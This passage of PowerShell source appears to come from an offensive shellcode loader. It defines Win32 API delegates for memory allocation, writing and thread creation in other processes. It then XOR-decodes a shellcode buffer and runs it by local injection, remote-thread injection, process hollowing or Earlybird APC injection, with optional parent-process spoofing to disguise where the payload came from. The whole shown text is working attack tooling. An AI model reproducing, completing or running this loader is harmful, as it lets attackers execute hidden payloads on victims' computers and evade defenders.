    $ProcessBasicInformation        = [PROCESS_BASIC_INFORMATION]::new()           # Used for Win32 function parameter(s)

    # SECURITY_ATTRIBUTES | https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ns-wtypesbase-security_attributes
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'nLength'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpSecurityDescriptor' ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'bInheritHandle'       ; Type = [Bool]   }
    )
    $SecurityAttributesType    = Build-Win32Struct -StructName "SECURITY_ATTRIBUTES" -MembersObject $StructMembers
    $SecurityAttributesTypeRef = $SecurityAttributesType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessAttributes         = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 1
    $ThreadAttributes          = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 2


    ### Load Required Win32 API Call(s) ###

    Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow

    Try {
        <#
        if ($PPIDspoof) { $StartupInfoRef = $StartupInfoExTypeRef }
        else            { $StartupInfoRef = $StartupInfoTypeRef }

        $CreateProcArgs = @(
            [String],                   #lpApplicationName
            [String],                   #lpCommandLine
            $SecurityAttributesTypeRef, #lpProcessAttributes
            $SecurityAttributesTypeRef, #lpThreadAttributes
            [Bool],                     #bInheritHandles
            [Int32],                    #dwCreationFlags
            [IntPtr],                   #lpEnvironment
            [String],                   #lpCurrentDirectory
            $StartupInfoTypeRef,        #lpStartupInfo
            $ProcessInformationTypeRef  #lpProcessInformation
        )
        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool])
        #>

        # Testing
        $CreateProcArgs = @(
            [String],                   #lpApplicationName
            [String],                   #lpCommandLine
            $SecurityAttributesTypeRef, #lpProcessAttributes
            $SecurityAttributesTypeRef, #lpThreadAttributes
            [Bool],                     #bInheritHandles
            [Int32],                    #dwCreationFlags
            [IntPtr],                   #lpEnvironment
            [String],                   #lpCurrentDirectory
            $StartupInfoExTypeRef,      #lpStartupInfo
            $ProcessInformationTypeRef  #lpProcessInformation
        )
        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool])

        $OpenProcArgs = @(
            [UInt32], # dwDesiredAccess
            [Bool],   # bInheritHandle
            [UInt32]  # dwProcessId
        )
        $OpenProcess = Load-Win32Function -Library "Kernel32.dll" -FunctionName "OpenProcess" -ParamTypes $OpenProcArgs -ReturnType ([IntPtr])

        $CallWindowProcArgs = @(
                [IntPtr], # lpPrevWndFunc
                [IntPtr], # hWnd
                [UInt32], # Msg
                [Int32],  # wParam
                [UInt32]  # lParam
            )
        $CallWindowProcW = Load-Win32Function -Library "User32.dll" -FunctionName "CallWindowProcW" -ParamTypes $CallWindowProcArgs -ReturnType ([IntPtr])

        $CreateThreadArgs = @(
                [IntPtr],                # lpThreadAttributes
                [UInt32],                # dwStackSize
                [IntPtr],                # lpStartAddress
                [IntPtr],                # lpParameter
                [UInt32],                # dwCreationFlags
                [UInt32].MakeByRefType() # lpThreadId
            )
        $CreateThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateThread" -ParamTypes $CreateThreadArgs -ReturnType ([IntPtr])

        $CreateRemThreadArgs = @(
            [IntPtr],                # hProcess
            [IntPtr],                # lpThreadAttributes
            [UInt32],                # dwStackSize
            [IntPtr],                # lpStartAddress
            [IntPtr],                # param
            [UInt32],                # dwCreationFlags
            [UInt32].MakeByRefType() # lpThreadId
        )
        $CreateRemoteThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateRemoteThread" -ParamTypes $CreateRemThreadArgs -ReturnType ([IntPtr])

        $ResThreadArgs = @(
            [IntPtr] # hThread
        )
        $ResumeThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ResumeThread" -ParamTypes $ResThreadArgs -ReturnType ([UInt32])

        $VirtProtectArgs = @(
            [IntPtr],                 #lpAddress
            [UInt32],                 # dwSize
            [UInt32],                 # flNewProtect
            [UInt32].MakeByRefType()  # lpflOldProtect
        )
        $VirtualProtect = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualProtect" -ParamTypes $VirtProtectArgs -ReturnType ([Bool])

        $VirtProtectExArgs = @(
            [IntPtr],                 #hProcess
            [IntPtr],                 #lpAddress
            [UInt32],                 # dwSize
            [UInt32],                 # flNewProtect
            [UInt32].MakeByRefType()  # lpflOldProtect
        )
        $VirtualProtectEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualProtectEx" -ParamTypes $VirtProtectExArgs -ReturnType ([Bool])

        $VirtualAllocExArgs = @(
            [IntPtr], # hProcess
            [IntPtr], # lpAddress
            [UInt32], # dwSize
            [UInt32], # flAllocationType
            [UInt32]  # flProtect
        )
        $VirtualAllocEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualAllocEx" -ParamTypes $VirtualAllocExArgs -ReturnType ([IntPtr])
        
        $ReadProcMemArgs = @(
            [IntPtr],               # hProcess
            [IntPtr],               # lpBaseAddress
            [Byte[]],               # lpBuffer
            [Int32],                # nSize
            [Int32].MakeByRefType() #lpNumberOfBytesRead
        )
        $ReadProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ReadProcessMemory" -ParamTypes $ReadProcMemArgs -ReturnType ([Bool])

        $WriteProcMemArgs = @(
            [IntPtr],                # hProcess
            [IntPtr],                # lpBaseAddress
            [byte[]],                # lpBuffer
            [UInt32],                # nSize
            [UInt32].MakeByRefType() # lpNumberOfBytesWritten
        )
        $WriteProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "WriteProcessMemory" -ParamTypes $WriteProcMemArgs -ReturnType ([Bool])
        
        $QueueUserArgs = @(
            [IntPtr], # pfnAPC
            [IntPtr], # hThread
            [IntPtr]  # dwData
        )
        $QueueUserAPC =  Load-Win32Function -Library "Kernel32.dll" -FunctionName "QueueUserAPC" -ParamTypes $QueueUserArgs -ReturnType ([IntPtr])

        $NtQueryInfoArgs = @(
            [IntPtr],                        # ProcessHandle
            [Int32],                         # ProcessInformationClass
            $ProcessBasicInformationTypeRef, # ProcessInformation
            [UInt32],                        # ProcessInformationLength
            [UInt32].MakeByRefType()         # ReturnLength
        )
        $NtQueryInformationProcess = Load-Win32Function -Library "Ntdll.dll" -FunctionName "NtQueryInformationProcess" -ParamTypes $NtQueryInfoArgs -ReturnType ([Int32])

        $InitProcThreadArgs = @(
            [IntPtr],                # lpAttributeList
            [Int32],                 # dwAttributeCount
            [Int32],                 # dwFlags
            [IntPtr].MakeByRefType() # lpSize  
        )
        $InitializeProcThreadAttributeList = Load-Win32Function -Library "Kernel32.dll" -FunctionName "InitializeProcThreadAttributeList" -ParamTypes $InitProcThreadArgs -ReturnType ([Bool])

        $UpdateProcThreadArgs = @(
            [IntPtr], # lpAttributeList
            [UInt32], # dwFlags
            [UInt32], # Attribute
            [IntPtr], # lpValue
            [UInt32], # cbSize
            [IntPtr], # lpPreviousValue
            [IntPtr]  # lpReturnSize
        )
        $UpdateProcThreadAttribute = Load-Win32Function -Library "Kernel32.dll" -FunctionName "UpdateProcThreadAttribute" -ParamTypes $UpdateProcThreadArgs -ReturnType ([Bool])
    }
    Catch { return (Write-Host '[!] Error! Failed to load Win32 API calls.' -ForegroundColor Red) }


    ### Initialize Key Variables ###

    # Format Shellcode
    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode -XorKey $XorKey -UseProxy $UseProxy
    if ($ShellcodeBuffer -isnot [byte[]]) { return }

    # Acquire Target Process
    if ($RemoteInject) { $TargetProcess = Get-Process -Id $TargetPID }

    # Validate Target Process
    if ($ProcHollow -or $APCInject) {
        if (Test-Path -LiteralPath $CreateProcess 2>$NULL) { $CreateProcess = (Get-Item -LiteralPath $CreateProcess).FullName }
        else                                               { $CreateProcess = (Get-Command -Name $CreateProcess).Path         }
    }

    # Determine target parent process
    if ($PPIDspoof) {

        $CurrentProc = Get-Process -Id $PID
        if ($ParentProcess -and !$ParentPID) {

            Try   { $TargetParent = Get-Process -Name $ParentProcess -ErrorAction Stop | ? { ($_.SI -eq $CurrentProc.SI) -and ($_.PriorityClass -eq $CurrentProc.PriorityClass) } }
            Catch { return (Write-Host '[!] Error! Cannot find the target parent process.' -ForegroundColor Red) }

            if ($TargetParent.Length -gt 1) {
                $i = Get-Random -Minimum 0 -Maximum ($TargetParent.Length - 1)
                $ParentPID = ($TargetParent[$i]).Id
            }
            else { $ParentPID = $TargetParent.Id }
        }

        # Make Sure SI and Priority Class match current process
        $ParentProc  = Get-Process -Id $ParentPID
        if ($ParentProc.SI -ne $CurrentProc.SI)                       { return (Write-Host '[!] Error! Target parent process has a different session ID.' -ForegroundColor Red)  }
        if ($ParentProc.PriorityClass -ne $CurrentProc.PriorityClass) { Write-Host '[!] Warning! Target parent process has a different priority class.' -ForegroundColor Magenta }
    }


    ### MAIN ###

    # Note: need to change CreateProcessA() to utilize STARTUPINFOEXA by default.

    if ($LocalInject) {
        Write-Host "[!] Performing Local Process Injection (Threadless)" -ForegroundColor Green
        Local-ProcessInject
    }
    elseif ($RemoteInject) {
        Write-Host "[!] Performing Remote Process Injection" -ForegroundColor Green
        Remote-ProcessInject
    }

    elseif ($ProcessHollow) {
        Write-Host "[!] Performing Process Hollowing" -ForegroundColor Green

        if ($PPIDspoof) { 
          $SpoofedInfo = PPID-Spoof
        }
        Process-Hollow -SuspendedProcess $SpoofedInfo
    }

    elseif ($APCInject) {
        Write-Host "[!] Performing Earlybird APC Queue Injection" -ForegroundColor Green

        if ($PPIDspoof) { $SpoofedInfo = PPID-Spoof }
        Earlybird-Inject -SuspendedProcess $SpoofedInfo
    }
}
